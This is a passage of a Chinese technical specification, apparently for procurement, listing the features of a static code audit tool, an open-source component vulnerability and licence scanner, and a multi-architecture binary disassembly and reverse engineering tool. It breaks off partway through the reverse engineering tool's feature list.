DevOps（TFS）、ClearCase、StartTeam、共享目录、FTP等多种版本控制系统，包括支持通过分支、tags、commitID进行代码拉取。</p><p>例外配置：用户可配置例外文件或文件夹，这些文件将仅参与编译过程，不参与安全检测，以减少不必要的审计工作量。</p><p>重新检测：支持对检测失败的任务重新发起检测，确保每项任务都能获得审计结果。</p><p>任务删除与清理：用户能够删除选中的检测任务，并自动清理相关的结果文件，保持工作环境的整洁。</p><p>结果通知：检测完成后，工具将自动将结果通过电子邮件通知给代码的相关人员（创建者和访问者），确保及时反馈。</p><p>项目整合管理：支持将多个工程（源码）组合到一个项目中，实现整合管理、持续检测、数据统计和趋势分析，以适应实际复杂情况。</p><p>项目列表展示：以列表形式展示所有项目，方便用户管理和访问。</p><p>项目高级搜索：用户可以通过项目名、创建者、检测语言、创建时间等维度进行高级搜索。</p><p>项目创建与配置：用户可以创建项目并配置项目名、检测语言、检测源码等信息。</p><p>代码库集成（项目级别）：与任务级别相同，支持从远程代码库获取检测代码。</p><p>权限管理：支持将任务查看权限授予个人或部门，确保信息的安全性和适当的访问控制。</p><p>路径剪裁与误报降低：当某个缺陷已经被修复函数解决时，用户可以通过设置函数白名单进行自动化路径剪裁，减少误报。</p><p>检测批次概览：用户可以查看每个检测批次的详细检测情况。</p><p>检测差距分析：支持查看某检测批次与检测目标的差距，帮助用户识别关键缺失。</p><p>缺陷趋势分析：支持查看每个批次的缺陷变化趋势，用于评估安全改进措施的效果。</p><p>项目关注：用户可以关注特定项目，进行快捷查看，以便快速访问常用项目。</p><p>项目禁用：支持禁用项目，禁用的项目仅可查看检测数据，不可发起新的检测任务。</p><p>任务检测概要展示：展示任务基本信息、源代码信息、各语言源码行数统计、问题分类统计等检测概要。</p><p>代码仓库信息记录：记录并展示检测代码仓库地址、分支/tags、CommitID、代码者等信息。</p><p>依赖库查看：支持查看该检测任务的依赖库，以了解代码的外部依赖。</p><p>编译日志查看：支持查看该检测任务的编译日志，帮助诊断编译过程中的问题。</p><p>缺陷合并展示：对文件路径相同、爆发行相同的缺陷进行合并展示，提高问题查看的效率。</p><p>全文检索：支持对整个代码区的内容进行全文检索，包括但不限于函数名称等关键信息。</p><p>缺陷跟踪路径：提供同一分类跟踪路径图、单个缺陷跟踪路径表和图，以便用户了解缺陷产生的上下文和最佳修复点。</p><p>修复建议：对于检测出的问题，工具将提供修复建议，帮助开发者快速解决问题。</p><p>安全标准兼容：支持CERT、CWE、CWE/SANS TOP 25、GB/T 34943-2017 C/C++、GB/T 34944-2017 Java、GB/T 34946-2017 C#、GJB 5369-2005、GJB 8114-2013、ISO/IEC TR 24772、OWASP Mobile Top 10、OWASP TOP 10、PCI DSS、SJ/T 11682-2017、SJ/T 11683-2017等多种安全标准，确保代码审计能够满足国内外的安全要求。</p><p>缺陷搜索：支持根据缺陷的名称、分类、审计状态、所在文件、爆发行作者进行搜索，以便用户快速定位特定问题。</p><p>缺陷管理与集成：支持将缺陷按照分类、等级等维度筛选，批量到已配置的第三方Bug系统中，实现缺陷管理的自动化和集成。</p><h3 id="开源组件检查工具"><a href="#开源组件检查工具" class="headerlink" title="开源组件检查工具"></a>开源组件检查工具</h3><h4 id="工具概述-18"><a href="#工具概述-18" class="headerlink" title="工具概述"></a>工具概述</h4><p>搭建开源组件安全分析平台，对应用系统的源代码及私服仓库进行开源组件成分分析，识别出企业全部在用的开源组件资产和漏洞清单。</p><h4 id="功能实施方案-67"><a href="#功能实施方案-67" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>这款开源组件检查工具的功能十分强大，它能够支持多种格式的本地源代码检测，包括但不限于zip、rar和tar.gz压缩包。此外，工具的适用范围还扩展到了常见的代码仓库系统，如Git、SVN以及FireFly，它能够连接这些版本控制系统，并实现定时检测功能，确保代码库的持续监控和分析。同时，该工具也支持对jar包、War包以及二进制文件进行开源组件分析，帮助开发者识别和管理软件依赖中的潜在风险，从而提升安全性。通过这样的全面检测，开发团队可以及时发现并解决开源组件中的漏洞和许可证问题，保障软件合规性和安全性。</li><li>这款基于B/S架构的开源组件检查工具，支持多用户登录使用，实现了资源共享和协作审计。其强大的后台能力还能支持多任务并发检测，大幅提升工作效率。</li><li>该工具覆盖了市场上主流的编程语言，它能够识别Java、Python、JavaScript、.NET、PHP、Swift/OC、Go/Golang、Erlang、Scala、Ruby、Perl、R、Groovy、Kotlin、Clojure、RUST等语言的开源组件。其高效的识别算法为开发者提供了一个全面的安全审计解决方案，无论是面向对象的、函数式的还是命令式编程语言，都能够得到精确的组件分析和风险评估，确保软件安全性和依赖的透明性。</li><li>该工具的数据库中包含了超过400万个开源项目以及它们超过4000万个的历史和最新版本，提供了极其广泛的开源组件检查范围。用户可以便捷地进行项目和版本的查询，确保使用到的开源软件是最新且安全的，同时也方便了对旧版本的安全性回溯和审计。这一功能对于需要维护多版本软件的开发者来说尤其有价值。</li><li>这款开源组件检查工具不仅能够精确地分析出被测对象所使用的开源组件，还能提供组件的详细信息，这包括组件的名称、具体版本号，以及关键的安全相关信息，如组件危害等级（超危、高危、中危、低危等）。此外，该工具还能显示每个组件的最新更新日期、适用的许可协议，以及漏洞的具体分布情况。对于每个已知漏洞，工具还会评估漏洞利用的难度，帮助开发者更好地理解潜在风险，并据此采取相应的安全措施。这样的全面分析功能，使得开发者在选用和管理开源组件时，能够更加明智地做出决策，确保软件的安全性和合规性。</li><li>该工具的组件依赖分析功能极为强大，可以精确地识别并清晰地标明项目中使用的开源组件的直接来源和间接来源，以及它们的具体数量。它能够深入项目结构，定位每个组件在项目中的引用位置，无论这些组件是被直接引入还是作为其他组件的依赖间接使用。这种能力对于开发者来说至关重要，因为它可以帮助他们理解项目依赖的复杂性，确保依赖管理的准确性，并在升级或替换组件时，提供清晰的指导。</li><li>该工具提供了一个强大的统一管理平台，它不仅能够详尽地罗列出已检测项目中的所有开源组件资产，还允许用户将这些资产清单导出，以便于进一步的分析和记录。更为重要的是，该工具还展现了每个组件与项目之间的关联关系，这对于项目维护者来说是一个宝贵的资源，因为它使得追踪和管理这些组件变得更加简单和直观。通过这样的功能，开发者可以更加高效地掌握开源组件使用状况，确保顺利进行。</li><li>这款工具的组件审计功能非常实用，它能够对系统检测出的所有开源组件进行细致的审计，帮助开发者确认每个组件的状态，判断其是否存在遗留问题或者确认组件实际上并不构成安全或合规性问题。这种审计能力大幅提升了项目管理的效率和安全性，为开发者提供了清晰的组件安全状况概览。</li><li>这款工具为用户提供了全面的开源组件版本管理功能，能够自动推荐最新发布的组件版本，同时识别并提示与项目当前版本变动最小的无漏洞版本，确保升级过程中的兼容性。此外，它还会列出其他所有无漏洞的可用版本，供用户根据项目需求灵活选择，从而在确保安全的同时，最大限度地减少因版本变更可能带来的风险。</li><li>该工具的完整性校验功能对引入的jar包进行了严格的安全检查，通过获取应用程序所依赖的所有jar包，并提取其中的文件和元数据信息，使用一种哈希算法（如MD5、SHA-1或SHA-256）计算每个文件的哈希值，得到唯一的摘要，验证摘要是否改变，既可进行校验，确保每个jar包在开发过程中未遭篡改。这一措施对于防止潜在的代码注入攻击至关重要，提升了软件供应链的安全性，让开发者可以信赖每一个引入的组件保持原始且未被恶意修改，确保了代码库的完整性和安全。</li><li>该工具支持与代码仓库如GitLab、Gitee等集成，能够实现批量检测，自动分析多个开源组件，大幅提高了效率。</li><li>这款开源组件检查工具具备高级的安全性查验功能，它不仅能够精确查验特定开源组件的坐标，包括其版本号、组织和项目标识，还支持关键字模糊匹配，以便用户可以快速而全面地在整个数据库中检索相关组件。此工具的数据库覆盖了广泛的漏洞信息、安全等级和许可协议详情，使得开发者能够对任何一个已引入或计划引入的开源组件进行深入的安全分析。用户可以根据这些信息评估组件的安全风险，确保其遵守相应的许可协议，从而在项目开发的每一个阶段都维持代码的安全性和合规性。这项功能为开发者提供了一个强大的工具，以防止潜在的安全威胁，并确保开源组件的合法使用。</li><li>该工具允许用户根据项目需求自定义安全管控规则，例如设置某些组件为禁止使用或允许使用。在执行检测后，工具会在结果中明确标识出符合或违反这些规则的组件，并提供详细的管控日志，方便用户追踪和审计。</li><li>该工具不仅能够分析与开源组件直接相关的漏洞，而且其漏洞库与国内外权威的漏洞信息库，如中国国家信息安全漏洞库（CNNVD）和美国国家漏洞数据库（NVD），保持兼容。此外，工具还融合了来自开源社区的漏洞情报，包括那些尚未被权威漏洞库收录的信息，从而提供更为全面的安全视野。开发者可以依据这些数据，对项目中使用的组件进行全面的安全评估，确保软件的安全性得到有效提升。</li><li>该工具的功能不止于识别漏洞，它还能提供漏洞的详细信息，以便开发者深入了解和应对。对于每个检测到的漏洞，工具都能展示其名称、CVE编号、CNNVD编号、首次发布日期以及最新更新日期，同时包括了发布该漏洞信息的厂商。此外，工具详细列出了漏洞类型、全面的漏洞描述、以及漏洞的严重性等级，包括标识为超危、高危、中危或低危等。攻击类型、漏洞来源以及漏洞利用难度也一并提供，以便于用户评估潜在威胁。为了便于修复，工具还提供了解决方案和参考链接，使得开发者能够快速定位相关资源，及时采取措施解决安全问题。</li><li>针对开发者对安全性的高要求，这款开源组件检查工具提供了一个实用的功能，即支持导出已检测到的开源组件漏洞清单。该清单详尽记录了每个漏洞的关键信息，包括漏洞编号，确保了快速识别；漏洞名称，便于理解其性质；利用难度，帮助评估安全风险；影响的项目，明确指出哪些项目受到威胁；以及漏洞的发布日期，提供时间线索以便追踪漏洞历史。这使得开发团队能够有效地管理和修复安全漏洞，保障安全性和可靠性。</li><li>为提升漏洞管理效率，该开源组件检查工具支持高效检索功能，允许用户通过漏洞编号（包括CVE编号、CNNVD编号）、漏洞等级、检测项目以及时间等关键快速定位特定漏洞。这样的设计大大简化了漏洞追踪和修复流程，加快了安全速度。</li><li>该工具的一大亮点是其对组件许可协议的关联分析能力。系统不仅能识别和关联项目中使用的开源组件所遵循的各种许可协议，而且还能分析这些许可协议可能带来的风险等级。这样的功能使得开发者在选择和使用开源组件时，能够更加明智地评估合规性风险，确保合法性和安全性。</li><li>该工具在许可协议管理方面提供了全面的支持，它不仅提供许可协议的详细信息，包括协议简称、协议全称，还深入到协议内容的核心，包括协议授权明细，如允许使用、条件使用、禁止使用的具体条款。此外，工具还展示了标准标题、协议等级和完整的协议文本，使开发者能够全面理解协议的具体要求和限制。更进一步，该工具能够指出哪些组件及项目受到特定协议的影响，帮助团队做出合规的决策。</li><li>该工具具备强大的功能，能够导出已检测的许可协议清单，为用户提供了一种简便的方式来管理和审查项目中使用的开源许可协议。导出的协议清单详细记录了每个许可协议的简称、全称及其风险等级，并且清晰地列出了受影响的项目信息。这样的功能极大地方便了开发者对开源许可的合规性进行快速的评估和监控。</li><li>该工具支持高效检索功能，用户可以便捷地按照协议名称、协议风险等级或检测项目来进行协议检索，从而快速定位和分析特定的许可协议问题。</li><li>该工具具备先进的监控系统，当系统中的开源组件受到新的漏洞影响时，它能够自动关联并识别出这些组件对应的项目信息。随后，工具将向开发团队发出漏洞提醒和告警，确保团队能够及时获悉潜在的安全威胁。这一机制显著提升了软件维护的效率，帮助团队快速安全事件，采取必要的修复措施，从而保障了持续安全与稳定运行。</li><li>该工具提供了强大的检测结果导出功能，使用户能够将检测报告生成文档，其中详细列出了开源组件的各项信息，如组件名称、版本、发现的漏洞详情、组件的来源以及针对发现问题的建议版本等。用户可以根据需要选择不同的导出格式，包括Word文档、Excel表格或PDF文件，以适应不同的报告分析和呈现需求。此外，该工具还支持批量下载，允许用户一次性导出多个检测结果，极大地提高了工作效率，便于团队成员共享和审查这些关键的安全信息。</li><li>这款开源组件检查工具搭载了支持全量的本地化知识库，它详尽地包含了每个开源信息，其发布的所有版本信息，以及与之相关的开源协议细节。此外，工具还整合了一个全面的漏洞库信息系统，记录了漏洞详情及其修复方案，即便在离线状态下也能确保用户对组件安全性的全面把控。</li><li>这款工具支持定期提供知识库的离线更新包，确保即使在无法实时联网的情况下，用户也能通过系统后台管理界面轻松进行离线导入，及时更新知识库内容，从而维持组件检查的准确性和时效性。这项功能对于需要在严格安全环境中运行的系统尤为重要，它保证了即使在隔离的网络环境中，用户也能够获取最新的开源组件信息和安全漏洞数据。</li><li>提供license，包含数据库在内的功能。</li></ol><h4 id="技术实现内容-60"><a href="#技术实现内容-60" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-22"><a href="#软件方案-22" class="headerlink" title="软件方案"></a>软件方案</h5><p>1.用户管理：用户注册/登录/注销；用户权限分配与管理；用户操作记录与审计；用户个人信息管理；多用户协作支持。</p><p>2.项目管理：新建/导入项目；项目列表与状态查看；项目相关设置（如定时检测配置）；项目成员管理与权限分配；项目历史记录与版本控制。</p><p>3.检测任务：创建和配置检测任务；支持上传本地代码压缩包；远程仓库连接配置与检测；检测任务的进度监控；批量检测任务管理。</p><p>4.组件分析：开源组件依赖树展示；组件详细信息查看（名称、版本、危害等级等）；组件在项目中的位置定位；组件版本管理与建议更新；组件完整性校验。</p><p>5.安全与合规：漏洞检测与分析；安全漏洞数据库集成与更新；漏洞告警与提醒；安全规则自定义与管理；许可协议分析与风险评估。</p><p>6.审计与报告：审计日志记录与查看；源组件使用审计；漏洞与许可协议报告生成；报告自定义与导出（支持多种格式）；批量报告下载。</p><p>7.搜索与检索：组件、漏洞、许可协议的全局搜索；高级检索（按漏洞编号、等级等）；搜索结果的过滤与排序；搜索历史记录与快速重复搜索。</p><p>8.知识库与数据更新：本地化知识库的浏览与检索；知识库的定期自动或手动更新；知识库更新历史记录与版本管理；离线更新包的导入与应用。</p><p>9.系统设置与维护：系统基本设置（语言、主题等）；系统维护工具（备份、恢复等）；系统状态监控与日志。</p><h5 id="工具功能-22"><a href="#工具功能-22" class="headerlink" title="工具功能"></a>工具功能</h5><p>检测对象支持：支持本地源代码的检测，包括zip、rar、tar.gz等压缩包格式，确保用户可以轻松上传和检测本地代码库。支持远程代码仓库的检测，包括Git、SVN、FireFly等，用户可以通过提供仓库链接和认证信息来启动检测过程。定时检测功能允许用户设定周期性检测，以确保代码库的持续合规性和安全性。支持对jar包、War包、二进制文件等的开源组件分析，提供全面的检测能力。</p><p>系统架构与用户支持：采用B/S架构设计，用户无需安装客户端软件，可通过浏览器直接使用系统。支持多用户登录和操作，满足团队协作的需求。支持多任务并发检测，提高系统的工作效率。</p><p>编程语言支持：支持包括Java、Python、JavaScript、.NET、PHP、Swift/OC、Go/Golang、Erlang、Scala、Ruby、Perl、R、Groovy、Kotlin、Clojure、RUST等在内的主流编程语言的开源组件识别。</p><p>开源项目与版本支持：系统内置的开源项目数据库包含不少于400万个项目，版本数量不少于4000万，覆盖广泛的开源生态。</p><p>详细信息分析：能够分析并展示被测对象所使用的开源组件的详细信息，包括但不限于组件名称、版本、危害等级、更新日期、许可协议、漏洞分布和漏洞利用难度等。</p><p>组件依赖分析：支持组件依赖分析，可识别直接和间接依赖，为用户提供组件的依赖树视图。定位组件在项目中的具体引用位置，方便开发者快速定位和处理问题。</p><p>开源组件统一管理：提供强大的组件管理功能，用户可以查看、罗列和导出检测项目中的所有开源组件资产。提供组件与关联关系，帮助用户理解各组件在项目中的作用。</p><p>组件审计功能：提供组件审计功能，用户可以对检测出的开源组件进行确认和标注，以便于追踪和管理。</p><p>版本管理与建议：提供开源组件的最新发布版本信息，以及与当前版本差异最小的无漏洞版本推荐。提供其他无漏洞的可用版本，帮助用户选择最合适的组件版本。</p><p>完整性校验：对引入的jar包进行完整性校验，确保其内容未被篡改，保障代码安全。</p><p>批量检测支持：支持对代码仓库进行批量检测，提高大型检测效率。</p><p>组件安全性查：支持基于开源组件坐标的精确查验，以及关键字的模糊匹配，用户可通过这两种方式进行全局检索。</p><p>安全管控规则自定义：允许用户自定义安全管控规则，如禁止或允许使用特定的组件，并在检测结果中提供明确的结果标识和管控日志。</p><p>漏洞库兼容性：支持CNNVD、NVD等权威漏洞库，以及开源社区的漏洞情报，确保漏洞信息的全面性和时效性。</p><p>漏洞详细信息提供：提供漏洞的详细信息，包括漏洞名称、CVE编号、CNNVD编号、发布日期、更新日期、厂商信息、漏洞类型、描述、等级、攻击类型、来源、利用难度、解决方案、参考链接等。</p><p>漏洞清单导出：支持导出漏洞清单，方便用户进行进一步的分析和记录。</p><p>漏洞检索功能：支持按照漏洞编号、等级、检测项目、时间等条件进行漏洞的高级检索。</p><p>许可协议关联分析：系统能够关联分析开源组件使用的许可协议和该协议的风险等级，帮助用户理解法律风险。</p><p>许可协议详细信息：提供许可协议的详细信息，包括协议简称、全称、内容、授权明细、标题、等级、文本、影响的组件和项目等。</p><p>许可协议清单导出：支持导出许可协议清单，包含协议名称、等级、影响的项目等信息。</p><p>协议检索功能：支持根据协议名称、风险等级、检测项目进行协议检索。</p><p>漏洞提醒和告警：当新的漏洞影响到系统中的开源组件时，系统将自动关联项目信息，并进行漏洞提醒和告警。</p><p>检测结果导出功能：支持检测结果的导出，报告内容包括组件信息、漏洞信息、来源、建议版本等。支持Word、Excel、PDF格式，且支持批量下载。</p><p>本地化知识库支持：提供全量的本地化知识库，包括开源项目信息、版本信息、开源协议、漏洞库信息。</p><p>知识库离线更新：定期提供知识库的离线更新包，用户可通过系统后台界面离线导入，确保信息的最新性。</p><h3 id="二进制反汇编工具"><a href="#二进制反汇编工具" class="headerlink" title="二进制反汇编工具"></a>二进制反汇编工具</h3><h4 id="工具概述-19"><a href="#工具概述-19" class="headerlink" title="工具概述"></a>工具概述</h4><p>通过利用可执行的机器代码即二进制来分析应用程序的控制结构和运行方式,有助于信息安全从业人员更好地分析各种漏洞、病毒以及恶意软件,从而找到相应的解决方案。</p><h4 id="功能实施方案-68"><a href="#功能实施方案-68" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLBINcc</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>该工具支持超过50种不同架构的binary文件，包括流行的32位与64位文件，满足广泛的逆向工程需求。</li><li>该工具具有跨平台能力，支持的操作系统涵盖了Windows、Linux和Mac，使得各类用户无论在何种操作系统环境下，都能够利用这一工具进行二进制文件的分析和逆向工程任务，提升了工具的适用性和便捷性。</li><li>该工具的反汇编方案是市场上最全面的解决方案之一，它支持数十种CPU指令集的反编译，覆盖从传统的x86架构到现代的ARM和PowerPC架构。具体来说，工具支持的x64架构包括Intel x64和AMD64，这意味着它能够处理大多数现代桌面和服务器上运行的程序。对于移动设备和嵌入式系统，工具同样提供了强大的支持，包括ARM64架构（也称为AArch64），以及ARMv8-A架构下的Cortex-A50、Cortex-A53和Cortex-A57系列处理器。此工具不仅支持主流的CPU架构，还能够反编译特定的定制芯片，例如在iPhone 5s中使用的Apple A7处理器（基于Cyclone微架构）。此外，Analog Devices的AD218x系列DSP处理器（如ADSP-2181, ADSP-2183等）也在支持之列，这使得该工具在音频和信号处理领域的逆向工程中也能发挥巨大作用。对于Android应用开发者来说，该工具能够反编译Dalvik字节码（DEX），这对于分析和优化Android应用至关重要。而DEC Alpha、DSP563xx、DSP566xx以及TI的TMS320系列（包括TMS320C2X至TMS320C6X等）也在支持列表中，它们的源码级反编译能力为研究人员提供了深入理解和修改这些处理器上运行代码的能力。在嵌入式系统和游戏机开发领域，该工具的功能同样强大。它支持Hitachi/Renesas的SuperH系列，IBM/Motorola的PowerPC/POWER架构（包括Power ISA扩展、Freescale ISA扩展、SPE指令、AltiVec指令等），以及与之相关的游戏机专用指令集，如Cell BE指令（用于PlayStation 3）、Xenon指令（用于Xbox 360）以及Paired Single SIMD指令（用于Nintendo Wii和WiiU）。对于汽车行业中使用的Motorola/Freescale PowerPC核心和处理器，工具同样提供了全面的支持。这包括MPC5xx、MPC8xx、MPC8xxx系列，以及MPC5xxx系列（Qorivva）等。QorIQ系列处理器，以及Infineon的Tricore架构也在支持范围之内。而在更为专业的领域，如Intel的IA-64架构（Itanium）、MIPS系列（包括MIPS Mark I至MIPS64r3）、以及Mitsubishi、Nec、STMicroelectronics和Siemens的处理器，该工具都能提供反编译服务。最后，对于微控制器的开发和分析，这款工具也不遗余力。它支持Microchip的16位PIC系列（包括PIC24和dsPIC系列），这对于嵌入式系统和物联网设备的开发者来说是一个极大的便利。该工具的广泛支持使其可以成为逆向工程师、安全分析师和嵌入式系统开发者的重要工具。其广泛的兼容性确保了无论面对何种复杂的CPU架构或指令集，都能提供精确的反编译和深入的分析能力。能够支持的指令集如下所示：</li></ol><p>x64 architecture (Intel x64 and AMD64)</p><p>ARM64 Architecture (aka AArch64)</p><p>ARMv8-A: Cortex-A50/Cortex-A53/Cortex-A57</p><p>ARMv8 (custom): Apple A7 (Cyclone microarchitecture, used in iPhone 5s)</p><p>Analog Devices AD218x series (ADSP-2181, ADSP-2183, ADSP-2184(L/N), ADSP-2185(L/M/N), ADSP-2186(L/M/N), ADSP-2187(L/N), ADSP-2188M/N, ADSP-2189M/N)</p><p>Dalvik (Android bytecode, DEX)</p><p>DEC Alpha</p><p>DSP563xx, DSP566xx, DSP561XX (comes with source code)</p><p>TI TMS320C2X, TMS320C5X, TMS320C6X, TMS320C64X, TMS 320C54xx, TMS320C55xx, TMS320C3 (comes with source code)</p><p>TI TMS320C27x/TMS320C28x</p><p>Hewlett-Packard HP-PA (comes with source code)</p><p>Hitachi/Renesas SuperH series: SH1, SH2, SH3, Hitachi SH4 (Dreamcast), SH-4A, SH-2A, SH2A-FPU</p><p>IBM/Motorola PowerPC/POWER architecture, including Power ISA extensions:</p><p>Book E (Embedded Controller Instructions)</p><p>Freescale ISA extentions (isel etc.)</p><p>SPE (Signal Processing Engine) instructions</p><p>AltiVec (SIMD) instructions</p><p>Hypervisor and virtualization instructions</p><p>All instructions from the Power ISA 2.06 specification (Vector, Decimal Floating Point, Integer Multiply-Accumulate, VSX etc.)</p><p>Cell BE (Broadband Engine) instructions (used in PlayStation 3)</p><p>VLE (Variable Length Encoding) compressed instruction set</p><p>Xenon (Xbox 360) instructions, including VMX128 extension</p><p>Paired Single SIMD instructions (PowerPC 750CL/Gekko/Broadway/Espresso, used in Nintendo Wii and WiiU)</p><p>Motorola/Freescale PowerPC-based cores and processors, including (but not limited to):</p><p>MPC5xx series: MPC533/MPC535/MPC555/MPC556/MPC561/MPC562/MPC563/MPC564/MPC566</p><p>Note: code compression features of MPC534/MPC564/MPC556/MPC566 (Burst Buffer Controller) are currently not supported</p><p>MPC8xx series (PowerQUICC): MPC821/MPC850/MPC860</p><p>MPC8xxx series (PowerQUICC II, PowerQUICC II Pro, PowerQUICC III): MPC82xx/MPC83xx/MPC85xx/MPC87xx</p><p>MPC5xxx series (Qorivva): MPC55xx, MPC56xx, MPC57xx</p><p>Power PC 4xx, 6xx, 74xx, e200 (including e200z0 with VLE), e500 (including e500v1, e500v2 and e500mc), e600, e700, e5500, e6500 cores</p><p>QorIQ series: P1, P2, P3, P4, P5 and T1, T2, T4 families</p><p>Infineon Tricore architecture (up to architecture v1.6)</p><p>Intel IA-64 Architecture - Itanium.</p><p>Motorola DSP 56K</p><p>Motorola MC6816</p><p>MIPS</p><p>MIPS Mark I (R2000)</p><p>MIPS Mark II (R3000)</p><p>MIPS Mark III: (R4000, R4200, R4300, R4400, and R4600)</p><p>MIPS Mark IV: R8000, R10000, R5900 (Playstation 2)</p><p>MIPS32, MIPS32r2, MIPS32r3 and MIPS64, MIPS64r2, MIPS64r3</p><p>Allegrex CPU (Playstation Portable), including VFPU instructions</p><p>Cavium Octeon ISA extensions</p><p>MIPS16 (MIPS16e) Application Specific Extension</p><p>MIPS-MT, MIPS-3D, smartMIPS Application Specific Extensions</p><p>Toshiba TX19/TX19A Family Application Specific Extension (MIPS16e+ aka MIPS16e-TX)</p><p>Mitsubishi M32R(comes with source code)</p><p>Mitsubishi M7700 (comes with source code)</p><p>Mitsubishi M7900 (comes with source code)</p><p>Nec 78K0 and Nec 78K0S (comes with source code)</p><p>STMicroelectronics ST9+, ST-10 (comes with source code)</p><p>SPARCII, ULTRASPARC</p><p>Siemens C166 (flow)</p><p>Fujitsu F2MC-16L, Fujitsu F2MC-LC (comes with source code)</p><p>16-bit Microchip PIC series (PIC24, dsPIC: PIC24XX, PIC30XX, PIC33XX)</p><ol><li>该工具不仅能进行高级二进制反汇编，还支持集成WinDbg和Symbian调试器，为Windows和Symbian系统的开发者提供强大的调试功能。</li><li>该工具能够支持使用debugserver协议来与设备建立连接。debugserver协议是一种通用的调试通信协议，用于在调试器和目标设备之间传输调试信息。通过支持debugserver协议，该工具可以与各种类型的设备进行通信，从而实现高效的调试过程</li><li>该工具应具备交互式、可编程的多处理器反汇编器功能。这使得用户可以根据自己的需求编写脚本或插件来扩展工具的功能，提高反汇编的灵活性和自动化程度。同时，交互式界面还允许用户实时查看反汇编结果并进行调整，提高工作效率。</li><li>该工具是一个支持交互式、可编程的多处理器反汇编器，它能够应对复杂的逆向工程挑战。支持FAT文件系统（文件访问表）。</li><li>该工具支持用户交互性，如代码重构、重命名符号和添加评论，以提高逆向工程的效率。</li><li>该工具提供图形化界面，支持控制流图(CFG)和调用图(Callgraphs)，以便用户更直观地理解和分析二进制代码。</li><li>该工具支持扩展，允许用户通过Python编写客户端脚本，实现自定义功能和自动化任务。</li><li>该工具支持扩展，允许用户通过插件和脚本增强其功能，实现更灵活的二进制反汇编处理。</li><li>该工具设计考虑了离线使用的需求，即便在没有互联网连接的环境下，也能保证正常工作，满足用户在隔离网络中的分析任务。</li><li>工具兼容Intel x86架构，支持集成GDB和LLDB调试器，覆盖所有平台包括Android，为开发者提供全面的调试能力。</li><li>本工具支持Intel x86-64架构，并与GDB及LLDB调试器完美兼容，涵盖所有平台使用需求，包括Android，为开发者提供了强大的跨平台调试能力。</li><li>该工具针对ARM架构提供了全面的支持，集成了GDB和LLDB调试器，确保在所有平台上包括Android设备上的兼容性和调试效率，满足了多样化的开发需求。</li><li>此工具为ARM64架构提供了强大支持，整合了GDB和LLDB调试器，以确保无论是在桌面还是移动平台，包括Android系统，都能提供一致的调试体验。</li><li>该工具针对MIPS架构提供了强大的调试功能，通过集成了GDB和LLDB调试器，可以在包括Android在内的所有平台上进行高效的代码分析和故障排查。</li><li>该工具支持Intel x86架构，并集成了GDB和LLDB调试器，确保开发者能够在所有平台上，包括Android系统，进行全面的调试和反汇编工作，提高了跨平台开发的便捷性和效率。</li><li>作为一款固件代码逆向测试工具，它具备用户友好的交互界面，同时提供可编程性和可扩展性以适应不同的测试需求。此外，该工具支持多处理器架构，并能够跨平台工作，无论是在Windows、Linux还是WinCE平台上，都能够无缝地进行固件分析和调试，以满足广泛的应用场景和开发者需求。</li><li>该工具拥有广泛的CPU指令集支持，覆盖了市场上主流及特定领域的处理器，包括但不限于Intel x86、x64，MIPS，68000和c8051，ARM系列，Z80以及PowerPC等，确保能够满足各类软件开发和安全分析的需求，为专业人士提供强大的逆向工程能力。</li><li>固件代码逆向测试工具是一种强大的分析工具，旨在帮助开发人员和安全研究人员理解和分析未知的二进制代码。该工具应当具备多种关键功能，以便于用户更深入地探究固件代码的内部工作原理。二进制搜索功能能够快速定位代码中的特定数据或指令序列。动态调试功能是该工具的另一个核心组成部分，它允许用户在实际运行时监视程序的行为。流程图功能提供了一种可视化的方式来表示程序的执行流程。流程图功能提供了一种可视化的方式来表示程序的执行流程。</li><li>通用平台逆向工具支持瑞萨RH850指令集，使得该工具能够为瑞萨RH850指令集提供强大的逆向工程支持，满足专业人士在多样化的应用场景下的需求。</li><li>通用平台逆向工程工具，它专为分析和理解目标文件的内部结构和逻辑而设计。该工具的一个核心功能是支持扫描目标文件以识别和确认常见的文件签名。</li><li>通用平台逆向工具，它具备了扫描目标文件中指定字符序列的能力。这意味着用户可以利用此工具来搜索和定位文件内部的特定数据模式，这对于理解和分析文件的结构至关重要。</li><li>通用平台逆向工具具备了强大的功能，特别是在扫描目标文件以识别其中的常见可执行代码方面。这个功能对于逆向工程师来说至关重要，因为它允许他们快速地发现和分析文件中的执行指令和代码逻辑。</li><li>通用逆向工程工具，它的一个核心功能是支持使用自定义的魔术签名文件。通过这项功能，用户能够指定一个特制的签名文件，该文件包含了一系列预定义的字节模式，这些模式对应于特定的文件类型或代码结构。</li><li>通用平台逆向工具提供了一项极为便捷的功能：支持自动提取已知的文件类型。逆向工程师在分析复杂的二进制文件时，可以大幅度节省时间和精力，因为工具能够自动识别和提取文件中包含的已知类型数据。</li><li>通用平台逆向工具支持将文件或文件夹提取到用户指定的自定义目录。此功能为逆向工程师提供了更高的操作灵活性和组织性，使他们能够在进行复杂分析时，将重要的二进制文件或整个项目文件夹系统地组织在特定的工作目录中。</li><li>通用平台逆向工具提供了一个非常实用的功能：支持限制每个提取的文件大小。这意味着用户可以根据自己的需求预设一个大小限制，确保每个从二进制数据中提取出来的文件都不会超过这个限制。</li><li>通用平台逆向工具提供了一个关键的功能，它允许用户限制提取文件的数量。这一功能特别适用于那些需要从大量数据中提取特定数量文件的情况，使用户能够在执行文件提取操作时，设置一个精确的文件数量上限。</li><li>通用平台逆向工具具备从文件中读取数据的能力，但同时提供了一项特定的操作限制——不执行提取使用程序。这一设计使得用户可以安全地分析和审查文件内容，而无需担心工具会自动执行任何提取动作，这对于需要在安全环境下仅仅查看或监测数据的情况尤为重要。</li><li>通用平台逆向工具提供了对原始deflate压缩流的扫描支持，它能够识别并处理遵循deflate压缩算法的数据流。这一功能对于逆向工程师来说至关重要，因为它们经常需要对压缩数据进行分析，以便理解和重构原始数据结构。</li><li>通用平台逆向工具具备了对原始LZMA压缩流的扫描能力，这意味着它能够直接分析采用LZMA（Lempel-Ziv-Markov链算法）压缩技术的数据流。LZMA是一种广泛使用的压缩算法，以其出色的压缩比和可选的高压缩设置而著称。</li><li>通用平台逆向工具提供了一个精确的筛选机制，允许用户专门扫描那些文件名与指定的正则表达式匹配的文件。正则表达式是一种强大的模式匹配语法，它可以定义复杂的文本搜索条件，因此